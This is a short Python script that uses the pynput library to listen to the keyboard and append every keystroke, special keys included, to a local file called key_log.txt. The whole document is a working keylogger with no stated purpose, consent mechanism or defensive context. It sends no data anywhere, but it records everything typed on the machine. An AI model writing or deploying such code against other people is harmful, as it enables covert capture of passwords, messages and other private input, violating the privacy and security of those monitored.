from pynput import keyboard

LOG_FILE = "key_log.txt"

def run(key):
    try:
        k = key.char
    except AttributeError:
        k = f" [{key}] "

    with open(LOG_FILE, "a") as f:
        f.write(k)

with keyboard.Listener(on_press=run) as listener:
    listener.join()